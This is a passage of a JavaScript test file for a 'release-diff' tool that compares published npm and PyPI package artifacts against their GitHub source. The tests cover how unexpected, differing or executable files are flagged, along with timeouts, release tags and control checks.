  assert.deepEqual(c.summaries.map((s) => [s.artifact, s.identical, s.source_folder]), [['sdist', 2, '.'], ['wheel', 1, 'src']]);
  assert.deepEqual(kinds(c), ['link_in_package']);
  assert.equal(f.calls.filter((x) => x.url.startsWith('https://codeload')).length, 1, 'one source archive for both artifacts');
});

test('choosePackages: the subject\'s own entries, then the seed, then attested deps.dev links, then the rest; at most three per ecosystem', () => {
  const servers = new Map([
    ['io.github.other/claim', [{ is_latest: true, packages: [{ registry_type: 'npm', identifier: 'squatter' }] }]],
    ['io.github.acme/tool', [{ is_latest: true, packages: [{ registry_type: 'npm', identifier: 'own' }, { registry_type: 'pypi', identifier: 'Own_Py' }] }]],
  ]);
  const p = choosePackages({ servers, seed: [{ registry: 'npm', identifier: 'seeded' }, { registry: 'pypi', identifier: 'own-py' }], depsdev: [{ ecosystem: 'npm', name: 'loose', attested: false }, { ecosystem: 'npm', name: 'signed', attested: true }], repo: 'acme/tool' });
  assert.deepEqual(p.map((x) => `${x.ecosystem}:${x.name}`), ['npm:own', 'npm:seeded', 'npm:signed', 'pypi:Own_Py']);
  assert.deepEqual(p.find((x) => x.name === 'Own_Py').sources, ['mcp_registry_own', 'seed']);
});

// ---------------------------------------------------------------- the worker, end to end

test('release-diff worker: bundles pass ingest\'s checks against the pinned registry, with the fault-side skips of this lane', async () => {
  const lane = laneOf('release-diff');
  const out = mkdtempSync(join(tmpdir(), 'rd-run-'));
  const routes = npmWorld({ pkg: { 'package.json': PKG_JSON, 'index.js': 'x', 'extra.sh': 'echo\n' }, src: { 'package.json': SRC_JSON, 'index.js': 'x' } });
  const items = [
    { subject: 'acme/tool', run_key: runKey(1), fence: 1 },
    { subject: 'npm:not-a-repo', run_key: runKey(2), fence: 2 },
  ];
  // The known answer reads acme/tool without the seed (as the shipped control reads ours), so it finds no package.
  const knownAnswerSpec = { 'release-diff': { subjects: ['acme/tool'], exact: { discovered: [] } } };
  const { outputs } = await runShard({
    laneName: 'release-diff', out, fetch: routes, knownAnswerSpec, seed: NPM_SEED, sleep: async () => {},
    env: { SHARD_ID: 'rd-1', ATTEMPT_ID: 'att-rd-1', ITEMS: JSON.stringify(items) },
  });
  assert.deepEqual(outputs.map((o) => o.outcome), ['read', 'not_a_github_repository']);
  const reg = pinnedRegistry();
  for (const it of items) {
    const i = items.indexOf(it);
    const v = judgeItem(join(out, String(i)), { attemptId: 'att-rd-1', fence: it.fence, runKey: it.run_key, registry: reg });
    assert.equal(v.outcome, 'accepted', JSON.stringify(v.problems?.slice(0, 3)));
  }
  const meta1 = JSON.parse(readFileSync(join(out, '1', 'meta.json'), 'utf8'));
  assert.deepEqual(meta1.skips, [{ stage: 'collect', reason: 'unsupported_layout', fault: 'tool' }]);
  const obs = readFileSync(join(out, '0', 'bundle', 'observations', 'release-diff.ndjson'), 'utf8').trim().split('\n').map((l) => JSON.parse(l));
  assert.deepEqual(obs.map((r) => r.field), ['release_artifacts', 'release_diff_summary', 'release_diff_findings', 'release_diff_held']);
  assert.equal(obs[2].value[0].kind, 'unexpected_file');
  assert.equal(lane.version, '1.4.0');
});

test('release-diff worker: the forgery control is contained (planted archive names, manifest keys and tags pose as a result)', async () => {
  const lane = laneOf('release-diff');
  const f = await forgeryControl(lane);
  assert.equal(f.control.observed, 'contained', f.files['controls/forgery.json']);
  const checks = JSON.parse(f.files['controls/forgery.json']).checks;
  assert.ok(checks.records >= 4 && checks.target_read);
});

test('known-answer: a lane may name several subjects and pin versions; the facts are merged, and a passing problem makes it unavailable', async () => {
  const seen = [];
  const fake = {
    name: 'fake', version: '1',
    async collect({ repos, pins }) { seen.push({ repos, pins }); return new Map(repos.map((r) => [r, { skips: [], records: [{ field: 'x', value: r }] }])); },
    factProblem: () => null,
    facts: (o) => ({ subjects: [o.records[0].value] }),
    mergeFacts: (parts) => ({ subjects: parts.flatMap((p) => p.subjects) }),
  };
  const spec = { fake: { subjects: ['a/b', 'c/d'], pins: { 'npm:x': '1.0.0' }, exact: { subjects: ['a/b', 'c/d'] } } };
  const k = await knownAnswerControl(fake, { http: null, spec });
  assert.equal(k.control.observed, 'match');
  assert.deepEqual(seen, [{ repos: ['a/b', 'c/d'], pins: { 'npm:x': '1.0.0' } }]);
  const down = await knownAnswerControl({ ...fake, factProblem: () => 'rate_limited' }, { http: null, spec });
  assert.equal(down.unavailable, 'rate_limited');
  const kaFile = JSON.parse(readFileSync(new URL('../fixtures/known-answer.json', import.meta.url), 'utf8'))['release-diff'];
  assert.deepEqual(Object.keys(kaFile.pins).sort(), ['npm:@isokron/mcp-check', 'pypi:mcp-write-safety-kit'], 'the shipped known answer reads fixed releases');
});

// ---------------------------------------------------------------- regressions found on real packages

test('R-RD-02: setuptools\' generated setup.cfg in an sdist (only [egg_info] tags) is generated metadata, not an unexpected file', () => {
  const r = cmp({ ecosystem: 'pypi', kind: 'sdist', pkg: { 'setup.cfg': '[egg_info]\ntag_build = \ntag_date = 0\n\n', 'pyproject.toml': '[project]\n' }, src: { 'pyproject.toml': '[project]\n' } });
  assert.deepEqual(r.findings, []);
  assert.deepEqual(r.summary.explained, [{ reason: 'generated_metadata', count: 1 }]);
  // A setup.cfg with anything else is still reported.
  const s = cmp({ ecosystem: 'pypi', kind: 'sdist', pkg: { 'setup.cfg': '[options]\ninstall_requires = evil\n', 'pyproject.toml': '[project]\n' }, src: { 'pyproject.toml': '[project]\n' } });
  assert.deepEqual(kinds(s), ['unexpected_file']);
});

test('R-RD-03: a file copied into the package from elsewhere in the repository (same bytes, another path) is explained', () => {
  const r = cmp({ pkg: { 'package.json': PKG_JSON, 'examples/tiny-tracker.yaml': 'plan: 1\n' }, src: { 'packages/w/package.json': PKG_JSON, 'examples/tiny-tracker/writecheck.yaml': 'plan: 1\n' } });
  assert.deepEqual(r.findings, []);
  assert.deepEqual(r.summary.explained, [{ reason: 'copied_from_repo', count: 1 }]);
  // Different bytes are not.
  const s = cmp({ pkg: { 'package.json': PKG_JSON, 'examples/x.yaml': 'plan: 2\n' }, src: { 'package.json': PKG_JSON, 'examples/y/x.yaml': 'plan: 1\n' } });
  assert.deepEqual(kinds(s), ['unexpected_file']);
});

test('R-RD-04: a source archive that outlasts our time limit is our limit (reader_limit, fault tool, not retried), and a subject stops starting downloads after its budget', async () => {
  let now = 0;
  const clock = () => now;
  // codeload answers, then the stream dies after the time limit: our limit, not an outage.
  const slow = npmWorld({ pkg: { 'package.json': PKG_JSON }, src: {}, extra: [{ prefix: 'https://codeload.github.com/', body: Buffer.from('\x1f\x8b broken gzip') }] });
  const timed = async (url, init) => { const r = await slow(url, init); if (url.startsWith('https://codeload')) now += 125_000; return r; };
  let c = await collectSubject(http(timed), 'acme/tool', { seed: NPM_SEED, clock });
  assert.equal(c.artifacts[0].outcome, 'source_time_limit');
  assert.deepEqual(c.skips, [{ stage: 'source', reason: 'reader_limit', fault: 'tool' }]);
  // The same cut stream inside the time limit is a passing problem, retried.
  now = 0;
  c = await collectSubject(http(slow), 'acme/tool', { seed: NPM_SEED, clock });
  assert.deepEqual(c.skips, [{ stage: 'source', reason: 'upstream_unavailable', fault: 'infra', retryable: true }]);
  // Over the subject's budget, no download starts.
  now = 0;
  const late = async (url, init) => { const r = await slow(url, init); if (url.includes('/latest')) now += 400_000; return r; };
  c = await collectSubject(http(late), 'acme/tool', { seed: NPM_SEED, clock });
  assert.equal(c.artifacts[0].outcome, 'subject_time_budget');
  assert.deepEqual(c.skips, [{ stage: 'collect', reason: 'reader_limit', fault: 'tool' }]);
  assert.ok(!c.artifacts[0].bytes);
});

test('R-RD-05: a per-language release tag (py-v0.1.0, js-v1.0.0) is the version\'s tag, not a missing one', () => {
  const t = new Map([['py-v0.1.0', { object: D, commit: C, annotated: true }], ['js-v1.0.0', { object: D, commit: C, annotated: true }]]);
  assert.equal(resolveTag(t, { name: 'mcp-write-safety-kit', version: '0.1.0', ecosystem: 'pypi' }).match, 'ecosystem_prefixed');
  assert.equal(resolveTag(t, { name: '@mcp-write-safety/kit', version: '1.0.0', ecosystem: 'npm' }).match, 'ecosystem_prefixed');
});

// ---------------------------------------------------------------- shared HTTP

test('R-RD-01: a body that stops mid-read is a passing problem (upstream_unavailable), not a lane failure', async () => {
  let n = 0;
  const body = new ReadableStream({ pull(c) { if (n++ === 0) c.enqueue(new TextEncoder().encode('{"a":')); else c.error(new TypeError('terminated')); } });
  await assert.rejects(readCapped(new Response(body), 1000, 'registry.npmjs.org'), (e) => e instanceof FetchProblem && e.code === 'upstream_unavailable');
});

test('subjectOutput: the four fields, in order, every time', () => {
  const o = subjectOutput({ artifacts: [], summaries: [], findings: [], held: [], skips: [], stages: {} });
  assert.deepEqual(o.records.map((r) => [r.field, r.value]), [['release_artifacts', []], ['release_diff_summary', []], ['release_diff_findings', []], ['release_diff_held', []]]);
});

test('R-RD-21: a source-code extension alone is not "executable": an unexpected .ts/.js/.py file is medium, and high only with a mode bit, a launcher or native extension, a binary or an install file', () => {
  const r = cmp({
    pkg: {
      'package.json': PKG_JSON, 'src/a.ts': 'export const a = 1;\n', 'extras/b.js': 'exports.b = 1;\n', 'tools/c.py': 'print(1)\n',
      'bin/cli.js': '#!/usr/bin/env node\n', 'tools/d.sh': 'echo\n', 'run.cmd': 'echo\n', 'native/e.node': Buffer.from([0, 1, 2, 3]),
    },
    src: { 'package.json': SRC_JSON },
    modes: { 'bin/cli.js': 0o755 },
  });
  const by = Object.fromEntries(r.findings.filter((f) => f.kind === 'unexpected_file').map((f) => [f.path, f]));
  for (const p of ['src/a.ts', 'extras/b.js', 'tools/c.py']) {
    assert.deepEqual([by[p].level, by[p].executable, by[p].code_extension], ['medium', false, true], p);
  }
  for (const p of ['bin/cli.js', 'tools/d.sh', 'run.cmd', 'native/e.node']) assert.equal(by[p].level, 'high', p);
  assert.deepEqual([by['bin/cli.js'].executable, by['bin/cli.js'].code_extension], [true, false], 'the mode bit makes it executable, not a code-only file');
  assert.deepEqual(r.summary.findings_by_level, { high: 4, medium: 3 }, 'every finding is counted by level, before any cap');
});

test('R-RD-21: a source file that differs from the repository stays high (the contents moved), whatever its extension', () => {
  const r = cmp({ pkg: { 'package.json': PKG_JSON, 'index.ts': 'b\n' }, src: { 'package.json': SRC_JSON, 'index.ts': 'a\n' } });
  const f = r.findings.find((x) => x.kind === 'content_differs');
  assert.deepEqual([f.level, f.code_extension, f.executable], ['high', true, false]);
});

test('R-RD-21: a script that names its interpreter (#!) is executable even where the archive kept no mode bit (wheel, zip): high; without #! a .py is medium', () => {
  const r = cmp({
    pkg: { 'package.json': PKG_JSON, 'tools/run': '#!/usr/bin/env python3\nprint(1)\n', 'tools/run.py': '#!/usr/bin/env python3\nprint(1)\n', 'tools/lib.py': 'print(1)\n' },
    src: { 'package.json': SRC_JSON },
  });
  const by = Object.fromEntries(r.findings.filter((f) => f.kind === 'unexpected_file').map((f) => [f.path, f]));
  assert.deepEqual([by['tools/run'].level, by['tools/run'].executable], ['high', true]);
  assert.deepEqual([by['tools/run.py'].level, by['tools/run.py'].executable, by['tools/run.py'].code_extension], ['high', true, false]);
  assert.deepEqual([by['tools/lib.py'].level, by['tools/lib.py'].code_extension], ['medium', true]);
});
